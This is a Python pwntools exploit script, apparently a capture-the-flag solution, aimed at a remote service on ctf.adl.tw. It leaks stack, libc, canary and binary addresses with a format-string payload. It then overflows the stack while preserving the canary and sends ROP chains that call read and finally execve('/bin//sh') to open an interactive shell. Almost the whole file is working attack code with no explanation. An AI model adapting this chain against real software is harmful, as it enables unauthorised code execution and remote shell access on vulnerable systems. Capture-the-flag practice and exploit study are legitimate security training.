#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft
import pwnlib
from struct import pack


debug = 0
host = ''
port = 0
if debug == 1:
    host ='localhost'
    port = '14115' 
else:
    host ='ctf.adl.tw'
    port = '11007'

pwn_file = "./server"
elf = ELF(pwn_file)
libc = ELF('libc.so.6')

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    c = process([pwn_file, port], env={'LD_PRELOAD': './libc.so.6'})
    #c = process([pwn_file, port])
    dbg_script = """
    # set follow-fork-mode child
    """
    gdb.attach(c, dbg_script)
    c.recvuntil('listening')

context.log_level = 100
context.log_level = 'debug'
if debug == 1:
    input()

# get libc and stack base
r = remote(host, port)
r.sendline("info %p %p %42$p %20$p %28$p")
stack_addr, _, libc_addr, canary, elf_addr = r.recv().split()
stack_addr = int(stack_addr, 16) + 0xa0 # rbp 
libc_addr = int(libc_addr, 16) - libc.symbols['__libc_start_main'] - 0xe7
canary = int(canary, 16)
elf_addr = int(elf_addr, 16) - 0x1b84
print(hex(stack_addr), hex(libc_addr), hex(elf_addr))
r.close()

"""
one_gadget ./libc.so.6
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""

one_gadget = libc_addr + 0x4f322
one_gadget = libc_addr + 0x10a38
nop_ret = libc_addr + 0x00000000000008aa # ret

r = remote(host, port)

p = b'nameof' + flat({0: p64(one_gadget)}, length=0x38, filler = '\0') +  p64(canary) + p64(stack_addr - 0xa8) + p64(elf_addr + 0x10f9)[:-3]
print(len(p) - 6)
assert(len(p) - 6 <= 77)

if debug == 1:
    input()

r.sendline(p)

p = b''
p += p64(libc_addr + 0x000000000002155f) # pop rdi ; ret 
p += p64(0x1)
# rsi = rsp
p += p64(libc_addr + 0x0000000000023e6a) # pop rsi ; ret
p += p64(stack_addr - 0xa8)
# rdx = 0x300
p += p64(libc_addr + 0x0000000000001b96) # pop rdx ; ret
p += p64(0x300)
p += p64(libc_addr + 0x210070 - 0x00100000) # read

assert(len(p) - 4 <= 77)
r.sendline(b'link' + p)
sleep(1)
r.sendline()
# r.sendline(b'link' + p64(elf_addr + 0x1246) * 1)

p = b''
p += p64(libc_addr + 0x001b96) # pop rdx ; ret
p += p64(stack_addr-0x100) # @ .data
p += p64(libc_addr + 0x0439c8) # pop rax ; ret
p += b'/bin//sh'
p += p64(libc_addr + 0x03093c) # mov qword ptr [rdx], rax ; ret
p += p64(libc_addr + 0x001b96) # pop rdx ; ret
p += p64(stack_addr-0x108) # @ .data + 8
p += p64(libc_addr + 0x0b17c5) # xor rax, rax ; ret
p += p64(libc_addr + 0x03093c) # mov qword ptr [rdx], rax ; ret
p += p64(libc_addr + 0x02155f) # pop rdi ; ret
p += p64(stack_addr-0x100) # @ .data
p += p64(libc_addr + 0x023e6a) # pop rsi ; ret
p += p64(stack_addr-0x108) # @ .data + 8
p += p64(libc_addr + 0x001b96) # pop rdx ; ret
p += p64(stack_addr-0x108) # @ .data + 8
p += p64(libc_addr + 0x0439c8) # pop rax ; ret
p += p64(59) # execve
p += p64(libc_addr + 0x0013c0) # syscall
#p = p64(elf_addr + 0x1246)


r.sendline(p64(nop_ret) * 0x30 + p)


r.interactive()
# c.interactive()
